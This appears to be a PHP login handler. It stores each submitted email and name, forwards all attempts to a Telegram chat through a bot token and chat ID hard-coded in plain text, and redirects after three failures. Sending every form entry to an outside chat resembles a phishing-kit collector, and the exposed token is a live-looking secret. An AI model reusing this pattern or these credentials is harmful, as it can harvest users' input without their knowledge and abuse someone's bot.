<?php
session_start();
define('ATTEMPTS_FILE', __DIR__ . '/attempts.json');

// --- Telegram Config ---
$telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ"; // replace with your bot token
$telegram_chat_id   = "6915371044";   // replace with your chat ID

// Ensure attempts.json exists
if (!file_exists(ATTEMPTS_FILE)) {
    file_put_contents(ATTEMPTS_FILE, json_encode([], JSON_PRETTY_PRINT));
}

// Load previous attempts
$attempts = json_decode(file_get_contents(ATTEMPTS_FILE), true);
if (!is_array($attempts)) $attempts = [];

// Sanitize input
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
$name  = filter_input(INPUT_POST, 'name', FILTER_SANITIZE_FULL_SPECIAL_CHARS);

if (!$email || !$name) {
    $_SESSION['error_message'] = "Invalid input provided.";
    header("Location: index.php");
    exit;
}

// Store email in session to prefill on failed attempts
$_SESSION['old_email'] = $email;

// Initialize or update attempts
if (!isset($attempts[$email])) {
    $attempts[$email] = [
        'names' => [$name],
        'count' => 1
    ];
} else {
    $attempts[$email]['names'][] = $name;
    $attempts[$email]['count'] += 1;
}

// Save attempts
file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));

// --- Telegram Notification ---
$names_list = implode(", ", $attempts[$email]['names']);
$total_attempts = $attempts[$email]['count'];
$telegram_message = "Login attempts for $email:\nNames tried: $names_list\nTotal attempts: $total_attempts";

// Send Telegram notification
$telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
file_get_contents($telegram_url . "?chat_id=$telegram_chat_id&text=" . urlencode($telegram_message));

// --- Three-strike logic ---
$attempt_number = $attempts[$email]['count'];
$correct_name = "John Doe"; // replace with your actual correct name

if ($name !== $correct_name && $attempt_number < 3) {
    $_SESSION['error_message'] = "Incorrect name entered.";
    header("Location: index.php");
    exit;
}

if ($name !== $correct_name && $attempt_number >= 3) {
    header("Location: https://example.com/blocked"); // replace with your URL
    exit;
}

// Successful login
unset($_SESSION['old_email']);
header("Location: dashboard.php");
exit;
